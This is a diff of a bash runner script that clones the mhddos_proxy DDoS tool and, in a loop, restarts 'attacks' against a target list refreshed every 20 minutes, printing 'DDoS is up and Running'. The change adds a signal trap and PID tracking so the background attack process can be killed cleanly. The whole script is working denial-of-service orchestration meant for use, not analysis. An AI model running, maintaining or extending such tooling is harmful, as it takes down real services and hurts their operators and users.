@@ -76,6 +76,8 @@ cd ~
 git clone https://github.com/alexnest-ua/runner_for_windows.git
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 
+trap 'echo signal received!; kill "${PID}"; wait "${PID}"' SIGINT SIGTERM
+
 # Restart attacks and update targets list every 20 minutes
 while [ 1 == 1 ]
 do	
@@ -160,6 +162,7 @@ do
             
             cd ~/mhddos_proxy
             python runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug&
+	    PID="$!"
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    	done
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval...\033[1;0m"
